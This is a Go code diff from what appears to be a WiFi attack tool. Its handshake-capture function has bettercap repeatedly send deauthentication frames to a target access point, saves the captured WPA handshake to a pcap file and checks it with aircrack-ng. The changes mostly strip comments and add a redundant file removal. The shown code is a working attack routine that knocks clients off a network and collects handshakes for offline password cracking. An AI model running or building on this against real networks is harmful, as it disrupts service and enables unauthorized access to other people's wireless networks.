@@ -35,7 +35,6 @@ func (h *HandshakeCapture) CaptureHandshake(target *Target, channels string) (st
 
 	h.db.SaveTarget(target, "", StatusScanning)
 
-	// Set up packet capture for handshakes
 	h.bettercap.RunCommand(fmt.Sprintf("wifi.recon.channel %s; set ticker.period 2; set ticker.commands \"wifi.deauth %s\"; ticker on", target.Channel, target.BSSID))
 
 	time.Sleep(12 * time.Second)
@@ -44,26 +43,24 @@ func (h *HandshakeCapture) CaptureHandshake(target *Target, channels string) (st
 
 	h.bettercap.RunCommand(fmt.Sprintf("wifi.recon.channel %s", channels))
 
-	// Move the pcap file from home directory to scanned directory
 	homeDir, err := os.UserHomeDir()
 	if err != nil {
 		return "", err
 	}
 	sourcePcap := filepath.Join(homeDir, targetPcap)
 
-	// Check if the pcap file exists in the home directory
 	if _, err := os.Stat(sourcePcap); err == nil {
-		// Move the file to the target directory
 		if err := os.Rename(sourcePcap, capFile); err != nil {
 			return "", err
 		}
+
+		os.Remove(sourcePcap)
 	}
 
 	if h.verifyHandshake(capFile, target.BSSID) {
 		return capFile, nil
 	}
 
-	// No handshake captured, remove the directory
 	os.RemoveAll(targetDir)
 
 	return "", nil
@@ -78,7 +75,6 @@ func (h *HandshakeCapture) verifyHandshake(capFile, bssid string) bool {
 	output, _ := cmd.CombinedOutput()
 
 	outputStr := string(output)
-	// Check for handshake presence regardless of aircrack-ng exit code
-	// aircrack-ng will show "1 handshake" even if dictionary is empty
+
 	return strings.Contains(outputStr, "1 handshake") || strings.Contains(outputStr, "handshake")
 }
